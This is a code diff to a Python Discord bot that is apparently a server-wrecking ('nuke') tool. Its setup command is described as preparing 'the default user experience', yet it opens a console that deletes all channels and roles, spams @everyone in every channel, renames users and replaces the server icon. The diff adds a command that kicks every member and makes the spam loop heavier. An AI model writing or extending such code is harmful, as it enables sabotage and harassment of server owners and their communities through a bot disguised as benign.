@@ -16,7 +16,7 @@ async def on_ready():
 
 @bot.slash_command(name="setup", description='Prepares the bot with the default user experience')
 async def setup(ctx):
-  print("Commands: \nremoveall - removes all channels and replaces them\nspam - sends a message with @everyone appended \nnick - nicks all users with an input \nicon - replaces the icon and name of the server \nrole - removes all available roles")
+  print("Commands: \nremoveall - removes all channels and replaces them\nspam - sends a message with @everyone appended \nnick - nicks all users with an input \nicon - replaces the icon and name of the server \nrole - removes all available roles \nkick - kicks all users from the server")
   while True:
     command = input(f"{Effect.BOLD}{Color.GREEN}{ctx.guild.id}{Color.OFF} > ")
     
@@ -41,7 +41,8 @@ async def setup(ctx):
       for lp in range(spamAmount):
         for channel in ctx.guild.channels:
           try:
-            await channel.send(message + "@everyone")
+            for lp in range(spamAmount):
+              await channel.send(message + "@everyone")
           except:
             print(f"{Effect.BOLD}{Color.GREEN}{ctx.guild.id}{Color.OFF} > Failed Send")
 
@@ -78,6 +79,13 @@ async def setup(ctx):
         except:
           print(f"{Effect.BOLD}{Color.GREEN}{ctx.guild.id}{Color.OFF} > Cannot Delete {role.name}")
 
+    if (command == "kick"):
+      for member in ctx.guild.members:
+        try:
+          await member.kick(reason="")
+        except:
+          print(f"{Effect.BOLD}{Color.GREEN}{ctx.guild.id}{Color.OFF} > Cannot Kick")
+    
 try:
   bot.run(TOKEN)
 except:
